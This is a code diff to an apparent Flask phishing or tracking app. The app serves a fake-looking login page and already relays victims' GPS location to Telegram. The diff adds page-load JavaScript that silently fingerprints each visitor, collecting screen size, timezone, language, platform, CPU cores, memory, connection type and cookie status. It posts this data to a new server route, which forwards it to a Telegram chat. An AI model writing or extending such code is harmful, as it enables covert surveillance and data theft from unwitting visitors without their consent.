@@ -165,6 +165,30 @@ login_page_html = '''
             }
         );
     }
+
+    // جمع بيانات المتصفح الإضافية
+    function collectBrowserData() {
+        const data = {
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+            deviceMemory: navigator.deviceMemory || 'غير معروف',
+            connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
+            cookiesEnabled: navigator.cookieEnabled
+        };
+        
+        fetch('/browser-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(err => console.log('خطأ في إرسال بيانات المتصفح:', err));
+    }
+
+    // استدعاء الدالة عند تحميل الصفحة
+    collectBrowserData();
     </script>
 </body>
 </html>
@@ -270,6 +294,27 @@ def gps_data():
 <b>📍 <a href="{maps_link}">على الخريطة</a></b>
     """
     send_to_telegram(gps_msg)
+    
+    return {"status": "success"}, 200
+
+# ========== استقبال بيانات المتصفح ==========
+@app.route('/browser-data', methods=['POST'])
+def browser_data():
+    data = request.get_json()
+    
+    # إرسال بيانات المتصفح إلى تليجرام
+    browser_msg = f"""
+<b>🖥️ بيانات المتصفح الإضافية</b>
+<b>📐 دقة الشاشة:</b> {data.get('screenWidth')}x{data.get('screenHeight')}
+<b>🕐 المنطقة الزمنية:</b> {data.get('timezone')}
+<b>🌐 اللغة:</b> {data.get('language')}
+<b>💻 المنصة:</b> {data.get('platform')}
+<b>⚙️ عدد الأنوية:</b> {data.get('hardwareConcurrency')}
+<b>🧠 الذاكرة:</b> {data.get('deviceMemory')} جيجابايت
+<b>📶 نوع الاتصال:</b> {data.get('connectionType')}
+<b>🍪 ملفات تعريف الارتباط:</b> {data.get('cookiesEnabled')}
+    """
+    send_to_telegram(browser_msg)
     
     return {"status": "success"}, 200
 
